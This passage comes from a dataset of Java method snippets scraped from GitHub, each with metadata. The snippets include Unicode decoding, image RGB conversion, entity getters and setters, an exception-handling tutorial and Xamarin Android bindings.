Character.UnicodeBlock.CJK_COMPATIBILITY_IDEOGRAPHS\n                || ub == Character.UnicodeBlock.CJK_UNIFIED_IDEOGRAPHS_EXTENSION_A\n                || ub == Character.UnicodeBlock.GENERAL_PUNCTUATION\n                || ub == Character.UnicodeBlock.CJK_SYMBOLS_AND_PUNCTUATION\n                || ub == Character.UnicodeBlock.HALFWIDTH_AND_FULLWIDTH_FORMS) {\n            return true;\n        }\n        return false;\n    }", "url": "https://raw.githubusercontent.com/buhuaqi/baidu-index/master/src/main/java/com/baidu/index/utils/FontUtil.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32689, "method_name": "decodeUnicode", "class_name": "FontUtil", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String decodeUnicode(final String unicode) {\n        StringBuffer string = new StringBuffer();\n\n        String[] hex = unicode.split(\"\\\\\\\\u\");\n\n        for (int i = 0; i < hex.length; i++) {\n\n            try {\n                // \u6c49\u5b57\u8303\u56f4 \\u4e00-\\u9fa5 (\u4e2d\u6587)\n                if (hex[i].length() >= 4) {\n                    String chinese = hex[i].substring(0, 4);\n                    try {\n                        int chr = Integer.parseInt(chinese, 16);\n                        boolean isChinese = isChinese((char) chr);\n                        //\u8f6c\u5316\u6210\u529f\uff0c\u5224\u65ad\u662f\u5426\u5728  \u6c49\u5b57\u8303\u56f4\u5185\n                        if (isChinese) {\n                            // \u8ffd\u52a0\u6210string\n                            string.append((char) chr);\n                            //\u5e76\u4e14\u8ffd\u52a0  \u540e\u9762\u7684\u5b57\u7b26\n                            String behindString = hex[i].substring(4);\n                            string.append(behindString);\n                        } else {\n                            string.append(hex[i]);\n                        }\n                    } catch (NumberFormatException e1) {\n                        string.append(hex[i]);\n                    }\n\n                } else {\n                    string.append(hex[i]);\n                }\n            } catch (NumberFormatException e) {\n                string.append(hex[i]);\n            }\n        }\n\n        return string.toString();\n    }", "url": "https://raw.githubusercontent.com/buhuaqi/baidu-index/master/src/main/java/com/baidu/index/utils/FontUtil.java", "stars": "13", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32690, "method_name": "getRGBData", "class_name": "ImageUtil", "params": ["File"], "throws": null, "modifiers": ["public", "static"], "return_type": "ImageInfo", "snippet": "    public static ImageInfo getRGBData(File file) {\n        if (file == null)\n            return null;\n        ImageInfo imageInfo;\n        try {\n            //\u5c06\u56fe\u7247\u6587\u4ef6\u52a0\u8f7d\u5230\u5185\u5b58\u7f13\u51b2\u533a\n            BufferedImage image = ImageIO.read(file);\n            imageInfo = bufferedImage2ImageInfo(image);\n        } catch (IOException e) {\n            e.printStackTrace();\n            return null;\n        }\n        return imageInfo;\n    }", "url": "https://raw.githubusercontent.com/ck003/face_recognition/master/src/main/java/me/kyriechen/face_recognition/utils/ImageUtil.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32691, "method_name": "getRGBData", "class_name": "ImageUtil", "params": ["InputStream"], "throws": null, "modifiers": ["public", "static"], "return_type": "ImageInfo", "snippet": "    public static ImageInfo getRGBData(InputStream input) {\n        if (input == null)\n            return null;\n        ImageInfo imageInfo;\n        try {\n            BufferedImage image = ImageIO.read(input);\n            imageInfo = bufferedImage2ImageInfo(image);\n        } catch (IOException e) {\n            return null;\n        } finally {\n            if (input != null) {\n                try {\n                    input.close();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n\n\n        return imageInfo;\n    }", "url": "https://raw.githubusercontent.com/ck003/face_recognition/master/src/main/java/me/kyriechen/face_recognition/utils/ImageUtil.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32692, "method_name": "bufferedImage2ImageInfo", "class_name": "ImageUtil", "params": ["BufferedImage"], "throws": null, "modifiers": ["public", "static"], "return_type": "ImageInfo", "snippet": "    public static ImageInfo bufferedImage2ImageInfo(BufferedImage image) {\n        ImageInfo imageInfo = new ImageInfo();\n        int width = image.getWidth();\n        int height = image.getHeight();\n        // \u4f7f\u56fe\u7247\u5c45\u4e2d\n        width = width & (~3);\n        height = height & (~3);\n        imageInfo.width = width;\n        imageInfo.height = height;\n        //\u6839\u636e\u539f\u56fe\u7247\u4fe1\u606f\u65b0\u5efa\u4e00\u4e2a\u56fe\u7247\u7f13\u51b2\u533a\n        BufferedImage resultImage = new BufferedImage(width, height, image.getType());\n        //\u5f97\u5230\u539f\u56fe\u7684rgb\u50cf\u7d20\u77e9\u9635\n        int[] rgb = image.getRGB(0, 0, width, height, null, 0, width);\n        //\u5c06\u50cf\u7d20\u77e9\u9635 \u7ed8\u5236\u5230\u65b0\u7684\u56fe\u7247\u7f13\u51b2\u533a\u4e2d\n        resultImage.setRGB(0, 0, width, height, rgb, 0, width);\n        //\u8fdb\u884c\u6570\u636e\u683c\u5f0f\u5316\u4e3a\u53ef\u7528\u6570\u636e\n        BufferedImage dstImage = new BufferedImage(width, height, BufferedImage.TYPE_3BYTE_BGR);\n        if (resultImage.getType() != BufferedImage.TYPE_3BYTE_BGR) {\n            ColorSpace cs = ColorSpace.getInstance(ColorSpace.CS_LINEAR_RGB);\n            ColorConvertOp colorConvertOp = new ColorConvertOp(cs, dstImage.createGraphics().getRenderingHints());\n            colorConvertOp.filter(resultImage, dstImage);\n        } else {\n            dstImage = resultImage;\n        }\n\n        //\u83b7\u53d6rgb\u6570\u636e\n        imageInfo.rgbData = ((DataBufferByte) (dstImage.getRaster().getDataBuffer())).getData();\n        return imageInfo;\n    }", "url": "https://raw.githubusercontent.com/ck003/face_recognition/master/src/main/java/me/kyriechen/face_recognition/utils/ImageUtil.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32693, "method_name": "cube", "class_name": "App", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "Box", "snippet": "    public static Box cube() {\n        return auto.cube();\n    }", "url": "https://raw.githubusercontent.com/iboxdb/jmegradle/master/src/main/java/demo/jmegradle/App.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32694, "method_name": "config", "class_name": "App", "params": [], "throws": null, "modifiers": ["private", "static"], "return_type": "AutoBox", "snippet": "    private static AutoBox config() {\n\n        String path = \"../jmedemodata\";\n        new File(path).mkdirs();\n        DB.root(path);\n        DB db = new DB();\n\n        db.getConfig().ensureTable(new Ason(Id, 0L), \"Table\");\n\n        return db.open();\n\n    }", "url": "https://raw.githubusercontent.com/iboxdb/jmegradle/master/src/main/java/demo/jmegradle/App.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32695, "method_name": "set", "class_name": "App", "params": ["Ason", "String", "Object"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void set(Ason ason, String name, Object value) {\n        Object old = ason.get(name);\n        if (old != null && value != null) {\n            value = new Variant(value).as(old);\n        }\n        ason.put(name, value);\n    }", "url": "https://raw.githubusercontent.com/iboxdb/jmegradle/master/src/main/java/demo/jmegradle/App.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32696, "method_name": "get", "class_name": "App", "params": ["Ason", "String"], "throws": null, "modifiers": ["public", "static"], "return_type": "T", "snippet": "    public static <T> T get(Ason ason, String name) {\n        return get(ason, name, null);\n    }", "url": "https://raw.githubusercontent.com/iboxdb/jmegradle/master/src/main/java/demo/jmegradle/App.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32697, "method_name": "get", "class_name": "App", "params": ["Ason", "String", "T"], "throws": null, "modifiers": ["public", "static"], "return_type": "T", "snippet": "    public static <T> T get(Ason ason, String name, T defaultValue) {\n        T re = (T) ason.get(name);\n        return re != null ? re : defaultValue;\n    }", "url": "https://raw.githubusercontent.com/iboxdb/jmegradle/master/src/main/java/demo/jmegradle/App.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32698, "method_name": "getId", "class_name": "OrdemServico", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Long", "snippet": "\tpublic Long getId() {\n\t\treturn id;\n\t}", "url": "https://raw.githubusercontent.com/jeanpsilva/osworks/master/src/main/java/com/algaworks/osworks/domain/model/OrdemServico.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32699, "method_name": "setId", "class_name": "OrdemServico", "params": ["Long"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setId(Long id) {\n\t\tthis.id = id;\n\t}", "url": "https://raw.githubusercontent.com/jeanpsilva/osworks/master/src/main/java/com/algaworks/osworks/domain/model/OrdemServico.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32700, "method_name": "getCliente", "class_name": "OrdemServico", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Cliente", "snippet": "\tpublic Cliente getCliente() {\n\t\treturn cliente;\n\t}", "url": "https://raw.githubusercontent.com/jeanpsilva/osworks/master/src/main/java/com/algaworks/osworks/domain/model/OrdemServico.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32701, "method_name": "setCliente", "class_name": "OrdemServico", "params": ["Cliente"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setCliente(Cliente cliente) {\n\t\tthis.cliente = cliente;\n\t}", "url": "https://raw.githubusercontent.com/jeanpsilva/osworks/master/src/main/java/com/algaworks/osworks/domain/model/OrdemServico.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32702, "method_name": "getDescricao", "class_name": "OrdemServico", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getDescricao() {\n\t\treturn descricao;\n\t}", "url": "https://raw.githubusercontent.com/jeanpsilva/osworks/master/src/main/java/com/algaworks/osworks/domain/model/OrdemServico.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32703, "method_name": "setDescricao", "class_name": "OrdemServico", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setDescricao(String descricao) {\n\t\tthis.descricao = descricao;\n\t}", "url": "https://raw.githubusercontent.com/jeanpsilva/osworks/master/src/main/java/com/algaworks/osworks/domain/model/OrdemServico.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32704, "method_name": "getPreco", "class_name": "OrdemServico", "params": [], "throws": null, "modifiers": ["public"], "return_type": "BigDecimal", "snippet": "\tpublic BigDecimal getPreco() {\n\t\treturn preco;\n\t}", "url": "https://raw.githubusercontent.com/jeanpsilva/osworks/master/src/main/java/com/algaworks/osworks/domain/model/OrdemServico.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32705, "method_name": "setPreco", "class_name": "OrdemServico", "params": ["BigDecimal"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setPreco(BigDecimal preco) {\n\t\tthis.preco = preco;\n\t}", "url": "https://raw.githubusercontent.com/jeanpsilva/osworks/master/src/main/java/com/algaworks/osworks/domain/model/OrdemServico.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32706, "method_name": "getStatus", "class_name": "OrdemServico", "params": [], "throws": null, "modifiers": ["public"], "return_type": "StatusOrdemServico", "snippet": "\tpublic StatusOrdemServico getStatus() {\n\t\treturn status;\n\t}", "url": "https://raw.githubusercontent.com/jeanpsilva/osworks/master/src/main/java/com/algaworks/osworks/domain/model/OrdemServico.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32707, "method_name": "setStatus", "class_name": "OrdemServico", "params": ["StatusOrdemServico"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setStatus(StatusOrdemServico status) {\n\t\tthis.status = status;\n\t}", "url": "https://raw.githubusercontent.com/jeanpsilva/osworks/master/src/main/java/com/algaworks/osworks/domain/model/OrdemServico.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32708, "method_name": "getDataAbertura", "class_name": "OrdemServico", "params": [], "throws": null, "modifiers": ["public"], "return_type": "OffsetDateTime", "snippet": "\tpublic OffsetDateTime getDataAbertura() {\n\t\treturn dataAbertura;\n\t}", "url": "https://raw.githubusercontent.com/jeanpsilva/osworks/master/src/main/java/com/algaworks/osworks/domain/model/OrdemServico.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32709, "method_name": "setDataAbertura", "class_name": "OrdemServico", "params": ["OffsetDateTime"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setDataAbertura(OffsetDateTime dataAbertura) {\n\t\tthis.dataAbertura = dataAbertura;\n\t}", "url": "https://raw.githubusercontent.com/jeanpsilva/osworks/master/src/main/java/com/algaworks/osworks/domain/model/OrdemServico.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32710, "method_name": "getDataFinalizacao", "class_name": "OrdemServico", "params": [], "throws": null, "modifiers": ["public"], "return_type": "OffsetDateTime", "snippet": "\tpublic OffsetDateTime getDataFinalizacao() {\n\t\treturn dataFinalizacao;\n\t}", "url": "https://raw.githubusercontent.com/jeanpsilva/osworks/master/src/main/java/com/algaworks/osworks/domain/model/OrdemServico.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32711, "method_name": "setDataFinalizacao", "class_name": "OrdemServico", "params": ["OffsetDateTime"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setDataFinalizacao(OffsetDateTime dataFinalizacao) {\n\t\tthis.dataFinalizacao = dataFinalizacao;\n\t}", "url": "https://raw.githubusercontent.com/jeanpsilva/osworks/master/src/main/java/com/algaworks/osworks/domain/model/OrdemServico.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32712, "method_name": "getComentarios", "class_name": "OrdemServico", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<Comentario>", "snippet": "\tpublic List<Comentario> getComentarios() {\n\t\treturn comentarios;\n\t}", "url": "https://raw.githubusercontent.com/jeanpsilva/osworks/master/src/main/java/com/algaworks/osworks/domain/model/OrdemServico.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32713, "method_name": "setComentarios", "class_name": "OrdemServico", "params": ["List<Comentario>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setComentarios(List<Comentario> comentarios) {\n\t\tthis.comentarios = comentarios;\n\t}", "url": "https://raw.githubusercontent.com/jeanpsilva/osworks/master/src/main/java/com/algaworks/osworks/domain/model/OrdemServico.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32714, "method_name": "hashCode", "class_name": "OrdemServico", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\tpublic int hashCode() {\n\t\tfinal int prime = 31;\n\t\tint result = 1;\n\t\tresult = prime * result + ((id == null) ? 0 : id.hashCode());\n\t\treturn result;\n\t}", "url": "https://raw.githubusercontent.com/jeanpsilva/osworks/master/src/main/java/com/algaworks/osworks/domain/model/OrdemServico.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32715, "method_name": "equals", "class_name": "OrdemServico", "params": ["Object"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean equals(Object obj) {\n\t\tif (this == obj)\n\t\t\treturn true;\n\t\tif (obj == null)\n\t\t\treturn false;\n\t\tif (getClass() != obj.getClass())\n\t\t\treturn false;\n\t\tOrdemServico other = (OrdemServico) obj;\n\t\tif (id == null) {\n\t\t\tif (other.id != null)\n\t\t\t\treturn false;\n\t\t} else if (!id.equals(other.id))\n\t\t\treturn false;\n\t\treturn true;\n\t}", "url": "https://raw.githubusercontent.com/jeanpsilva/osworks/master/src/main/java/com/algaworks/osworks/domain/model/OrdemServico.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32716, "method_name": "podeSerFinalizada", "class_name": "OrdemServico", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean podeSerFinalizada() {\n\t\treturn StatusOrdemServico.ABERTA.equals(getStatus());\n\t}", "url": "https://raw.githubusercontent.com/jeanpsilva/osworks/master/src/main/java/com/algaworks/osworks/domain/model/OrdemServico.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32717, "method_name": "naoPodeSerFinalizada", "class_name": "OrdemServico", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean naoPodeSerFinalizada() {\n\t\treturn !podeSerFinalizada();\n\t}", "url": "https://raw.githubusercontent.com/jeanpsilva/osworks/master/src/main/java/com/algaworks/osworks/domain/model/OrdemServico.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32718, "method_name": "finalizar", "class_name": "OrdemServico", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void finalizar() {\n\n\t\tif (naoPodeSerFinalizada()) {\n\t\t\tthrow new NegocioException(\"Ordem de servico nao pode ser finalizada\");\n\t\t}\n\n\t\tsetStatus(StatusOrdemServico.FINALIZADA);\n\t\tsetDataFinalizacao(OffsetDateTime.now());\n\t}", "url": "https://raw.githubusercontent.com/jeanpsilva/osworks/master/src/main/java/com/algaworks/osworks/domain/model/OrdemServico.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32719, "method_name": "getExtras", "class_name": "AnnotatedCursor", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Bundle", "snippet": "    public Bundle getExtras() {\n        Bundle extras = new Bundle();\n        extras.putAll(super.getExtras());\n        extras.putAll(mExtras);\n        return extras;\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/feeds/AnnotatedCursor.java", "stars": "74", "class_props": {"extends": "CursorWrapper", "implements": null, "modifiers": []}}, {"id": 32720, "method_name": "main", "class_name": "Demo01Exception", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {\n        /*\n            \u591a\u4e2a\u5f02\u5e38\u4f7f\u7528\u6355\u83b7\u53c8\u8be5\u5982\u4f55\u5904\u7406\u5462\uff1f\n            1. \u591a\u4e2a\u5f02\u5e38\u5206\u522b\u5904\u7406\u3002\n            2. \u591a\u4e2a\u5f02\u5e38\u4e00\u6b21\u6355\u83b7\uff0c\u591a\u6b21\u5904\u7406\u3002\n            3. \u591a\u4e2a\u5f02\u5e38\u4e00\u6b21\u6355\u83b7\u4e00\u6b21\u5904\u7406\u3002\n         */\n\n        //1. \u591a\u4e2a\u5f02\u5e38\u5206\u522b\u5904\u7406\u3002\n       /* try {\n            int[] arr = {1,2,3};\n            System.out.println(arr[3]);//ArrayIndexOutOfBoundsException: 3\n        }catch (ArrayIndexOutOfBoundsException e){\n            System.out.println(e);\n        }\n\n        try{\n            List<Integer> list = List.of(1, 2, 3);\n            System.out.println(list.get(3));//IndexOutOfBoundsException: Index 3 out-of-bounds for length 3\n        }catch (IndexOutOfBoundsException e){\n            System.out.println(e);\n        }*/\n\n        //2. \u591a\u4e2a\u5f02\u5e38\u4e00\u6b21\u6355\u83b7\uff0c\u591a\u6b21\u5904\u7406\u3002\n        /*try {\n            int[] arr = {1,2,3};\n            //System.out.println(arr[3]);//ArrayIndexOutOfBoundsException: 3\n            List<Integer> list = List.of(1, 2, 3);\n            System.out.println(list.get(3));//IndexOutOfBoundsException: Index 3 out-of-bounds for length 3\n        }catch (ArrayIndexOutOfBoundsException e){\n            System.out.println(e);\n        }catch (IndexOutOfBoundsException e){\n            System.out.println(e);\n        }*/\n\n        /*\n            \u4e00\u4e2atry\u591a\u4e2acatch\u6ce8\u610f\u4e8b\u9879:\n                catch\u91cc\u8fb9\u5b9a\u4e49\u7684\u5f02\u5e38\u53d8\u91cf,\u5982\u679c\u6709\u5b50\u7236\u7c7b\u5173\u7cfb,\u90a3\u4e48\u5b50\u7c7b\u7684\u5f02\u5e38\u53d8\u91cf\u5fc5\u987b\u5199\u5728\u4e0a\u8fb9,\u5426\u5219\u5c31\u4f1a\u62a5\u9519\n                ArrayIndexOutOfBoundsException extends IndexOutOfBoundsException\n         */\n        /*try {\n            int[] arr = {1,2,3};\n            //System.out.println(arr[3]);//ArrayIndexOutOfBoundsException: 3\n            List<Integer> list = List.of(1, 2, 3);\n            System.out.println(list.get(3));//IndexOutOfBoundsException: Index 3 out-of-bounds for length 3\n        }catch (IndexOutOfBoundsException e){\n            System.out.println(e);\n        }catch (ArrayIndexOutOfBoundsException e){\n            System.out.println(e);\n        }*/\n\n        //3. \u591a\u4e2a\u5f02\u5e38\u4e00\u6b21\u6355\u83b7\u4e00\u6b21\u5904\u7406\u3002\n        /*try {\n            int[] arr = {1,2,3};\n            //System.out.println(arr[3]);//ArrayIndexOutOfBoundsException: 3\n            List<Integer> list = List.of(1, 2, 3);\n            System.out.println(list.get(3));//IndexOutOfBoundsException: Index 3 out-of-bounds for length 3\n        }catch (Exception e){\n            System.out.println(e);\n        }*/\n\n        //\u8fd0\u884c\u65f6\u5f02\u5e38\u88ab\u629b\u51fa\u53ef\u4ee5\u4e0d\u5904\u7406\u3002\u5373\u4e0d\u6355\u83b7\u4e5f\u4e0d\u58f0\u660e\u629b\u51fa\u3002\n        //\u9ed8\u8ba4\u7ed9\u865a\u62df\u673a\u5904\u7406,\u7ec8\u6b62\u7a0b\u5e8f,\u4ec0\u4e48\u65f6\u5019\u4e0d\u629b\u51fa\u8fd0\u884c\u65f6\u5f02\u5e38\u4e86,\u5728\u6765\u7ee7\u7eed\u6267\u884c\u7a0b\u5e8f\n        int[] arr = {1,2,3};\n        System.out.println(arr[3]);//ArrayIndexOutOfBoundsException: 3\n        List<Integer> list = List.of(1, 2, 3);\n        System.out.println(list.get(3));//IndexOutOfBoundsException: Index 3 out-of-bounds for length 3\n\n        System.out.println(\"\u540e\u7eed\u4ee3\u7801!\");\n    }", "url": "https://raw.githubusercontent.com/liuminchao123/JavaWeb_Learning/master/02.%20java/Java/%E9%BB%91%E9%A9%AC%E6%95%99%E7%A8%8B/16.%E3%80%90%E5%BC%82%E5%B8%B8%E3%80%81%E7%BA%BF%E7%A8%8B%E3%80%91-%E7%AC%94%E8%AE%B0/code/05_ExceptionAndThread/src/com/itheima/demo03/Exception/Demo01Exception.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 32721, "method_name": "onAttachedToWindow", "class_name": "ShellSearchView", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onAttachedToWindow ()\n\t{\n\t\tn_onAttachedToWindow ();\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ShellSearchView.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono", "android", "android", "android"], "modifiers": ["public"]}}, {"id": 32722, "method_name": "n_onAttachedToWindow", "class_name": "ShellSearchView", "params": [], "throws": null, "modifiers": ["private", "native"], "return_type": "void", "snippet": "\tprivate native void n_onAttachedToWindow ();\n\n\n\tpublic void onLayout (boolean p0, int p1, int p2, int p3, int p4)\n\t{\n\t\tn_onLayout (p0, p1, p2, p3, p4);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ShellSearchView.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono", "android", "android", "android"], "modifiers": ["public"]}}, {"id": 32723, "method_name": "onLayout", "class_name": "ShellSearchView", "params": ["boolean", "int", "int", "int", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onLayout (boolean p0, int p1, int p2, int p3, int p4)\n\t{\n\t\tn_onLayout (p0, p1, p2, p3, p4);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ShellSearchView.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono", "android", "android", "android"], "modifiers": ["public"]}}, {"id": 32724, "method_name": "n_onLayout", "class_name": "ShellSearchView", "params": ["boolean", "int", "int", "int", "int"], "throws": null, "modifiers": ["private", "native"], "return_type": "void", "snippet": "\tprivate native void n_onLayout (boolean p0, int p1, int p2, int p3, int p4);\n\n\n\tpublic void onMeasure (int p0, int p1)\n\t{\n\t\tn_onMeasure (p0, p1);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ShellSearchView.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono", "android", "android", "android"], "modifiers": ["public"]}}, {"id": 32725, "method_name": "onMeasure", "class_name": "ShellSearchView", "params": ["int", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onMeasure (int p0, int p1)\n\t{\n\t\tn_onMeasure (p0, p1);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ShellSearchView.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono", "android", "android", "android"], "modifiers": ["public"]}}, {"id": 32726, "method_name": "n_onMeasure", "class_name": "ShellSearchView", "params": ["int", "int"], "throws": null, "modifiers": ["private", "native"], "return_type": "void", "snippet": "\tprivate native void n_onMeasure (int p0, int p1);\n\n\n\tpublic boolean onEditorAction (android.widget.TextView p0, int p1, android.view.KeyEvent p2)\n\t{\n\t\treturn n_onEditorAction (p0, p1, p2);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ShellSearchView.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono", "android", "android", "android"], "modifiers": ["public"]}}, {"id": 32727, "method_name": "onEditorAction", "class_name": "ShellSearchView", "params": ["android", "int", "android"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean onEditorAction (android.widget.TextView p0, int p1, android.view.KeyEvent p2)\n\t{\n\t\treturn n_onEditorAction (p0, p1, p2);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ShellSearchView.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono", "android", "android", "android"], "modifiers": ["public"]}}, {"id": 32728, "method_name": "n_onEditorAction", "class_name": "ShellSearchView", "params": ["android", "int", "android"], "throws": null, "modifiers": ["private", "native"], "return_type": "boolean", "snippet": "\tprivate native boolean n_onEditorAction (android.widget.TextView p0, int p1, android.view.KeyEvent p2);\n\n\n\tpublic void afterTextChanged (android.text.Editable p0)\n\t{\n\t\tn_afterTextChanged (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ShellSearchView.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono", "android", "android", "android"], "modifiers": ["public"]}}, {"id": 32729, "method_name": "afterTextChanged", "class_name": "ShellSearchView", "params": ["android"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void afterTextChanged (android.text.Editable p0)\n\t{\n\t\tn_afterTextChanged (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ShellSearchView.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono", "android", "android", "android"], "modifiers": ["public"]}}, {"id": 32730, "method_name": "n_afterTextChanged", "class_name": "ShellSearchView", "params": ["android"], "throws": null, "modifiers": ["private", "native"], "return_type": "void", "snippet": "\tprivate native void n_afterTextChanged (android.text.Editable p0);\n\n\n\tpublic void beforeTextChanged (java.lang.CharSequence p0, int p1, int p2, int p3)\n\t{\n\t\tn_beforeTextChanged (p0, p1, p2, p3);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ShellSearchView.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono", "android", "android", "android"], "modifiers": ["public"]}}, {"id": 32731, "method_name": "beforeTextChanged", "class_name": "ShellSearchView", "params": ["java", "int", "int", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void beforeTextChanged (java.lang.CharSequence p0, int p1, int p2, int p3)\n\t{\n\t\tn_beforeTextChanged (p0, p1, p2, p3);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ShellSearchView.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono", "android", "android", "android"], "modifiers": ["public"]}}, {"id": 32732, "method_name": "n_beforeTextChanged", "class_name": "ShellSearchView", "params": ["java", "int", "int", "int"], "throws": null, "modifiers": ["private", "native"], "return_type": "void", "snippet": "\tprivate native void n_beforeTextChanged (java.lang.CharSequence p0, int p1, int p2, int p3);\n\n\n\tpublic void onTextChanged (java.lang.CharSequence p0, int p1, int p2, int p3)\n\t{\n\t\tn_onTextChanged (p0, p1, p2, 